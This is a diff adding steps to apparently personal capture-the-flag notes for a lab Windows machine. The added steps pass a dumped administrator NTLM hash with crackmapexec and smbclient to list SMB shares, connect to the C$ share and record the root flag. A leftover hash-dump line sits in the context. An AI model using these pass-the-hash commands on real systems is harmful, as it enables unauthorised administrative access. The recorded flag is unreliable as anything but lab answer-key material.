@@ -189,3 +189,19 @@ SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:19ed5345c5594385f12a292d26cd5206::
 Will enumerate know on post enumeration attacks as we have got the valid user names.
 
 
+Will test the admin password in the SMB client for now
+```
+cme smb 10.10.10.103 -u 'administrator' -H 'f6b7160bfc91823792e0ac3a162c9267' --shares
+```
+![[Pasted image 20240411023832.png]]
+
+Let's connect to writeable share for the moment to get the flag
+```
+smbclient  //10.10.10.103/c$ -U 'administrator' --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267
+```
+![[Pasted image 20240411024509.png]]
+
+Root Flag
+```
+e8b8cfd4ac3f10c125b471ff69d6db0a
+```
